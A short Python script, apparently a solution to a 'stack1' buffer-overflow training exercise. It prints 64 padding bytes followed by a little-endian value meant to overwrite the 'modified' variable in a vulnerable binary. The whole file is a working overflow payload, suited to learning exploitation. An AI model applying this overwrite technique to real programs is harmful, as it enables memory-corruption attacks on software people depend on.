#!/usr/bin/python


# usage: ./stack1 <<< `./stack1.py`

# This time we are writing a specific value 
# to the address of 'modified'
# we need to write: 0x61626364
# which in LE is:   \x64\x63\x62\x61

pad = 'A'*64
LE = '\x64\x63\x62\x61'
print pad + LE
